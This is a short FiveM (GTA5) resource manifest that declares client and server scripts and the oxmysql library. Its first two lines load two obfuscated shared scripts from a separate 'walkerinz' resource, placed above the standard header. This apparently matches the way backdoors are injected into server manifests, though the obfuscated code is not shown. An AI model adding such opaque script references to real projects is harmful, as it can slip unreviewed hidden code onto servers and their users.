shared_script '@walkerinz/ai_module_fg-obfuscated.lua'
shared_script '@walkerinz/shared_fg-obfuscated.lua'
games { 'gta5' }

fx_version 'cerulean'

author 'walker'

client_scripts {
    'client.lua'
}

server_scripts {
    '@oxmysql/lib/MySQL.lua',
    'server.lua'
}